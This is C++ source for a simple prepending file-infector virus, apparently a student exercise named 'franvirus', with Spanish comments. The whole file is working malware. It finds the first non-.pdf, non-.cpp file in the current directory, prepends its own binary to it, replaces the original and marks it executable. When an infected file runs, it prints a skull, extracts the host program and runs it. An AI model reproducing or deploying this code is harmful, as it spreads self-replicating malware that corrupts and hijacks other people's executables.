#include <iostream>
#include <stdio.h>
#include <fcntl.h>
#include <fstream>
#include <dirent.h>
#include <string>
#include <errno.h>
#include <dirent.h>
#include <unistd.h>
using namespace std;


bool has_suffix(const string& s, const string& suffix)
{
    return (s.size() >= suffix.size()) && equal(suffix.rbegin(), suffix.rend(), s.rbegin());    
}

int main(){
 
    //Ver tamaño 
    string my_nombre = program_invocation_short_name;
    ifstream tam(my_nombre, std::ios::binary);
    filebuf* virusbuf=tam.rdbuf();
    int sizev= virusbuf->pubseekoff(0,tam.end);
    cout<<"tamaño del virus"<<sizev<<endl;
    tam.close();
    string my_victima;
    if(sizev==27368)
    {//INFECTAR
        char *path = NULL;
        path = getcwd(NULL, 0);
        if ( path != NULL)
        printf("%s\n", path);
        
        DIR *dir = opendir(path);
        if(!dir)
        {
            return 1;
        }
        dirent *entry;
        while((entry = readdir(dir))!=NULL) 
        {
            if(has_suffix(entry->d_name, ".") or has_suffix(entry->d_name, ".pdf") or has_suffix(entry->d_name, ".cpp"))
            {
                
            }
            else
            {
                cout<<entry->d_name<<endl;
                my_victima=entry->d_name;
                break;
            }
        }
        cout<<"my_victima es"<<my_victima<<endl;
        ifstream noob(my_victima, std::ios::binary);
        ifstream virus("franvirus", std::ios::binary);
        ofstream prov("virusT", std::ios::binary);
        
        filebuf* vicbuf=noob.rdbuf();
        int size_vic= vicbuf->pubseekoff(0,noob.end);
        cout<<"tamaño de la victima"<<size_vic<<endl;
        noob.close();
        
        ifstream noob2(my_victima, std::ios::binary);
//        char c_vic[size_vic];
        prov <<virus.rdbuf();
  //      noob2.read(c_vic,size_vic);
        prov <<noob2.rdbuf();
        
        
        noob2.close();
        virus.close();
        prov.close();
        closedir(dir);
        
        remove("franvirus");
        remove(my_victima.c_str());
        rename("virusT",my_victima.c_str());
        string comodin="chmod a+x "+my_victima;
        system(comodin.c_str());
                
    }
    else
    {//EJECUTAR
        string my_nombree = program_invocation_short_name;
        ifstream fentrada(my_nombree, std::ios::binary);
        
        filebuf* fentradabuf=fentrada.rdbuf();
        int sizeentrada= fentradabuf->pubseekoff (0,fentrada.end);
        cout<<"tamño de entrada : "<<sizeentrada<<endl;
        fentrada.close();
        
        ifstream fentrada2(my_nombree, std::ios::binary);
        char test[sizeentrada];
        char c_virus[27368];
        char c_victim[sizeentrada-27368];
        fentrada2.read(test,sizeentrada);
        for(int i=27368;i<sizeentrada;i++)
        {
            c_victim[i-27368]=test[i];
                //cout<<i-27368<<endl;           
        }
        cout<<" (     ) "<<endl;
        cout<<"| () () |"<<endl;
        cout<<" (  ^  ) "<<endl;
        cout<<"  |||||"<<endl;
        cout<<"  |||||"<<endl;
        //ofstream of_virus("test_v1", std::ios::binary);
        ofstream of_victima("test_v2", std::ios::binary);
        //of_virus<<"";
        //of_victima<<"";
        //filebuf* buf_virus=of_virus.rdbuf();
        
        //buf_virus->sputn(c_virus,9096);
        
        filebuf* buf_victima=of_victima.rdbuf();
        buf_victima->sputn(c_victim,sizeentrada-27368);
        //of_victima.write(c_victim,sizeentrada-26616);
        
        of_victima.close();
        fentrada2.close();
        
        system("chmod a+x test_v2");
        system("./test_v2");
        remove("test_v2");
    
    }
    //------------------

    return 0;
}
